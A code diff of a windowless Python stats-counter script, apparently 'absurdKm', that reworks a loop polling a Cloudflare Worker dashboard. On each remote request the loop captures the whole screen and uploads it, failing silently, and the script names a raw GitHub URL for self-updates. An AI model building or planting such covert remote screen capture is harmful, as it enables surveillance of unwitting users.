@@ -55,7 +55,7 @@ SHOT_MAX_W = 2560                      # définition max de la capture envoyée 
 SHOT_MAX_H = 1600
 SHOT_QUALITY = 85                      # qualité JPEG (1-100)
 
-VERSION = "1.7.6"
+VERSION = "1.7.7"
 UPDATE_URL = "https://raw.githubusercontent.com/fenix1048/assets-21st.dev/main/absurdeKm.pyw"
 
 # --- tableau de bord en ligne (Cloudflare Worker) ---
@@ -330,17 +330,25 @@ def cloud_request(path, data=None, timeout=30):
         return json.loads(r.read().decode("utf-8"))
 
 def cloud_loop():
-    """Envoie les stats régulièrement et exécute les demandes de capture. Échec silencieux."""
+    """Envoie les stats et exécute les captures demandées. Échec silencieux."""
     pc = socket.gethostname()
     last_push = 0.0
+    last_id = None
     while True:
         try:
             if time.monotonic() - last_push >= CLOUD_PUSH_S:
                 cloud_request("/api/push", {"pc": pc, "stats": stats_snapshot()})
                 last_push = time.monotonic()
-            if cloud_request("/api/poll?pc=" + urllib.parse.quote(pc)).get("capture"):
-                image = capture_screen_jpeg_b64()
-                cloud_request("/api/result", {"pc": pc, "image": image}, timeout=60)
+            cmd = cloud_request("/api/poll?pc=" + urllib.parse.quote(pc))
+            rid = cmd.get("id")
+            if rid and rid != last_id:          # une seule capture par demande
+                last_id = rid
+                try:
+                    image = capture_screen_jpeg_b64()
+                    cloud_request("/api/result", {"id": rid, "image": image}, timeout=60)
+                except Exception as e:
+                    # on prévient le tableau de bord au lieu de le laisser attendre
+                    cloud_request("/api/result", {"id": rid, "error": str(e)[:200]})
         except Exception:
             pass  # absurdKm continue de compter même si le serveur ne répond pas
         time.sleep(CLOUD_POLL_S)
